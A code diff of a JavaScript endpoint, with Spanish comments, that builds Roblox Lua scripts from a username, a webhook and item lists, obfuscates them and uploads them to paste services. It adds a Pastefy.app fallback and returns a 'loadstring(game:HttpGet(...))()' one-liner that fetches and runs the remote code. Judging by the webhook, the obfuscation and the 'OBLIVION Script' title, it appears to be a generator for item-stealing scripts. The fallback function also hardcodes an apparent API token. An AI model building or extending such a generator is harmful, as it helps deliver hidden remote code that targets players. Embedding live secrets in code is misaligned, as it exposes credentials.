@@ -28,47 +28,66 @@ export default async function handler(req, res) {
             } catch (error) {
                 console.error('Error al ofuscar:', error.message);
                 obfuscationError = error.message;
-                // No fallamos, seguimos con el script sin ofuscar
                 finalScript = script;
                 obfuscated = false;
             }
         }
 
-        // 3. SIEMPRE subir a Pastefy interno (con o sin ofuscación)
+        // 3. Intentar guardar en Pastefy interno (Supabase)
+        let pasteUrl = null;
+        let pasteError = null;
+
         try {
-            const pasteUrl = await saveToInternalPaste(
+            pasteUrl = await saveToInternalPaste(
                 finalScript,
                 `Script ${obfuscated ? 'ofuscado' : ''} para ${username}`,
                 userId
             );
+            console.log('Paste guardado en Supabase:', pasteUrl);
+        } catch (error) {
+            console.error('Error al guardar en Pastefy interno:', error.message);
+            pasteError = error.message;
+        }
 
-            // Devolver el loadstring corto
+        // 4. Si falló el paste interno, intentar con Pastefy.app (fallback)
+        if (!pasteUrl) {
+            try {
+                console.log('Intentando subir a Pastefy.app (fallback)...');
+                pasteUrl = await createPastefyPasteFallback(finalScript);
+                console.log('Paste subido a Pastefy.app:', pasteUrl);
+            } catch (fbError) {
+                console.error('Error en Pastefy.app fallback:', fbError.message);
+                pasteError = pasteError ? `${pasteError} | Fallback: ${fbError.message}` : fbError.message;
+            }
+        }
+
+        // 5. Si se logró obtener una URL de paste, devolver loadstring
+        if (pasteUrl) {
             return res.status(200).json({
                 loadstring: `loadstring(game:HttpGet("${pasteUrl}"))()`,
                 script: finalScript,
                 pasteUrl: pasteUrl,
                 obfuscated: obfuscated,
-                warning: obfuscationError || null
-            });
-
-        } catch (pasteError) {
-            console.error('Error al guardar en Pastefy interno:', pasteError);
-            // Si falla el paste, devolver el script completo (fallback)
-            return res.status(200).json({
-                script: finalScript,
-                obfuscated: obfuscated,
-                error: 'No se pudo guardar en Pastefy interno.'
+                warning: obfuscationError || null,
+                pasteError: pasteError || null
             });
         }
 
+        // 6. Si no se pudo guardar en ningún pastefy, devolver el script completo (fallback extremo)
+        return res.status(200).json({
+            script: finalScript,
+            obfuscated: obfuscated,
+            error: `No se pudo guardar el paste. Errores: ${pasteError}`
+        });
+
     } catch (error) {
-        console.error('Error general:', error);
+        console.error('Error general en generate:', error);
         return res.status(500).json({ error: error.message });
     }
 }
 
 // ============================================================
-//  CONSTRUIR SCRIPT
+//  CONSTRUIR SCRIPT (sin cambios)
 // ============================================================
 function buildScript(username, webhook, mode, brainrots, skins, gears) {
     function luaTable(arr, indent = '    ') {
@@ -166,4 +185,51 @@ async function saveToInternalPaste(content, title, userId) {
 
     const data = await response.json();
     return data.url;
+}
+
+// ============================================================
+//  FALLBACK: SUBIR A PASTEFY.APP (si el interno falla)
+// ============================================================
+async function createPastefyPasteFallback(content) {
+    const PASTEFY_API_TOKEN = process.env.PASTEFY_API_TOKEN || '7yGnlCgnDuzQVPMjBt90RIiv031jzwA6CMLt7VBYlx5LN4VceDW2EOcHQ7lR';
+    const url = 'https://pastefy.app/api/v2/paste';
+    const payload = {
+        content: content,
+        title: 'OBLIVION Script',
+        syntax: 'lua',
+        expires: 'never'
+    };
+
+    const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${PASTEFY_API_TOKEN}`
+        },
+        body: JSON.stringify(payload)
+    });
+
+    if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(`Pastefy.app error (${response.status}): ${errorText}`);
+    }
+
+    const result = await response.json();
+
+    let pasteId = null;
+    if (result.paste && result.paste.id) {
+        pasteId = result.paste.id;
+    } else if (result.id) {
+        pasteId = result.id;
+    } else if (result._id) {
+        pasteId = result._id;
+    } else if (result.pasteId) {
+        pasteId = result.pasteId;
+    }
+
+    if (!pasteId) {
+        throw new Error(`No se pudo obtener el ID del paste. Respuesta: ${JSON.stringify(result)}`);
+    }
+
+    return `https://pastefy.app/${pasteId}/raw`;
 }
